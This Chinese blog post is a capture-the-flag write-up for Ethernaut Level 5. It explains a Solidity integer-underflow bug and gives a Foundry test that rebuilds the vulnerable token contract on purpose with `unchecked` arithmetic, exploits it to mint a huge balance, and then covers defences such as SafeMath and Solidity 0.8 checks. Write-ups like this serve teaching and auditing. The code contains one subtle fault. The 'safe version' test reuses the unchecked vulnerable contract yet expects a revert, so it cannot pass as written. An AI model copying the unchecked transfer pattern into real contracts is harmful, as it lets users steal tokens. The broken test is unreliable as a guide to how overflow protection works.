---
title: 'Ethernaut Level 5: Token - 整数下溢攻击详解'
date: 2025-01-25 15:10:00
updated: 2025-01-25 15:10:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 整数下溢
  - 算术溢出
  - SafeMath
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "深入学习整数下溢攻击的原理和危害，了解 SafeMath 库的重要性和现代 Solidity 的内置保护机制。"
---

# 🎯 Ethernaut Level 5: Token - 整数下溢攻击详解

> **关卡链接**: [Ethernaut Level 5 - Token](https://ethernaut.openzeppelin.com/level/5)  
> **攻击类型**: 整数下溢攻击  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

1. **获得大量代币** - 从初始的 20 个代币增加到大量代币
2. **理解整数溢出** - 掌握算术运算的安全问题

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        // 🚨 漏洞：没有检查下溢出
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
```

### 漏洞识别

**整数下溢问题**：

1. **无符号整数特性** - `uint` 类型不能为负数
2. **下溢行为** - 当 `0 - 1` 时，结果变成 `2^256 - 1`
3. **检查失效** - `require(balances[msg.sender] - _value >= 0)` 总是为真

### 攻击原理

```solidity
// 假设用户余额为 20
uint balance = 20;
uint transferAmount = 21;

// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)
uint result = balance - transferAmount;
// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935

// require 检查：巨大的正数 >= 0，总是为真
require(result >= 0); // ✅ 通过检查
```

## 💻 Foundry 实现

### 攻击测试代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)
contract VulnerableToken {
    mapping(address => uint) public balances;
    uint public totalSupply;

    constructor(uint _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        // 故意使用不安全的算术运算
        unchecked {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract TokenTest is Test {
    VulnerableToken public token;
    
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        // 部署代币合约，初始供应量 1000
        token = new VulnerableToken(1000);
        
        // 给攻击者 20 个代币
        token.transfer(attacker, 20);
    }

    function testTokenUnderflowExploit() public {
        console.log("=== 攻击前状态 ===");
        console.log("攻击者余额:", token.balanceOf(attacker));
        console.log("受害者余额:", token.balanceOf(victim));
        
        vm.startPrank(attacker);
        
        // 🎯 关键攻击：转账超过余额的代币
        uint256 transferAmount = 21; // 大于 20 的余额
        token.transfer(victim, transferAmount);
        
        vm.stopPrank();
        
        console.log("=== 攻击后状态 ===");
        console.log("攻击者余额:", token.balanceOf(attacker));
        console.log("受害者余额:", token.balanceOf(victim));
        
        // 验证下溢攻击成功
        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币
        assertEq(token.balanceOf(victim), transferAmount);
    }
    
    function testUnderflowMath() public view {
        // 演示下溢计算
        uint256 balance = 20;
        uint256 transferAmount = 21;
        
        console.log("=== 下溢计算演示 ===");
        console.log("原始余额:", balance);
        console.log("转账金额:", transferAmount);
        
        unchecked {
            uint256 result = balance - transferAmount;
            console.log("下溢结果:", result);
            console.log("最大 uint256:", type(uint256).max);
            console.log("是否相等:", result == type(uint256).max);
        }
    }
    
    function testSafeVersion() public {
        // 演示安全版本
        VulnerableToken safeToken = new VulnerableToken(1000);
        safeToken.transfer(attacker, 20);
        
        vm.startPrank(attacker);
        
        // 在 Solidity 0.8.0+ 中，这会 revert
        vm.expectRevert(); // 期望交易失败
        safeToken.transfer(victim, 21); // 这在新版本中会失败
        
        vm.stopPrank();
    }
}
```

### 运行测试

```bash
forge test --match-contract TokenTest -vvv
```

## 🛡️ 防御措施

### 1. 使用 Solidity 0.8.0+

```solidity
pragma solidity ^0.8.0;

contract SafeToken {
    mapping(address => uint256) public balances;
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        // Solidity 0.8.0+ 自动检查溢出
        balances[msg.sender] -= _value; // 自动 revert 如果下溢
        balances[_to] += _value;
        return true;
    }
}
```

### 2. 使用 SafeMath 库 (旧版本)

```solidity
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract SafeTokenV6 {
    using SafeMath for uint256;
    
    mapping(address => uint256) public balances;
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法
        balances[_to] = balances[_to].add(_value); // 安全加法
        return true;
    }
}
```

### 3. 显式检查

```solidity
contract ExplicitCheckToken {
    mapping(address => uint256) public balances;
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] >= _value, "Insufficient balance");
        
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
}
```

## 📚 核心知识点

### 整数溢出类型

| 类型 | 描述 | 示例 |
|------|------|------|
| **上溢** | 超过最大值 | `type(uint256).max + 1 = 0` |
| **下溢** | 低于最小值 | `0 - 1 = type(uint256).max` |

### Solidity 版本对比

```solidity
// Solidity 0.7.x 及以下
function unsafeAdd(uint a, uint b) public pure returns (uint) {
    return a + b; // 可能溢出，无自动检查
}

// Solidity 0.8.0+
function safeAdd(uint a, uint b) public pure returns (uint) {
    return a + b; // 自动检查溢出，溢出时 revert
}

// 显式不安全操作 (0.8.0+)
function explicitUnsafe(uint a, uint b) public pure returns (uint) {
    unchecked {
        return a + b; // 显式跳过溢出检查
    }
}
```

### 安全数学运算

```solidity
// ✅ 安全的余额检查
function safeTransfer(address _to, uint256 _value) public {
    require(balances[msg.sender] >= _value, "Insufficient balance");
    
    balances[msg.sender] -= _value;
    balances[_to] += _value;
}

// ✅ 使用 SafeMath (旧版本)
function safeTransferLegacy(address _to, uint256 _value) public {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
}
```

## 🏛️ 历史案例

### 著名的整数溢出攻击

1. **PoWHCoin** (2018)
   - 攻击者利用整数溢出获得巨额代币
   - 导致项目完全崩溃

2. **BeautyChain (BEC)** (2018)
   - BatchOverFlow 漏洞
   - 造成代币价值归零

3. **SMT Token** (2018)
   - 类似的批量转账溢出漏洞
   - 交易所暂停交易

## 🎯 总结

Token 关卡揭示了早期 Solidity 的重要安全隐患：

- ✅ **整数溢出的严重后果** - 可以完全破坏代币经济学
- ✅ **版本升级的重要性** - Solidity 0.8.0+ 提供内置保护
- ✅ **SafeMath 的历史价值** - 在旧版本中提供安全保护
- ✅ **显式检查的必要性** - 总是验证关键假设

这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。

---

## 🔗 相关链接

- **[上一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**
- **[下一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**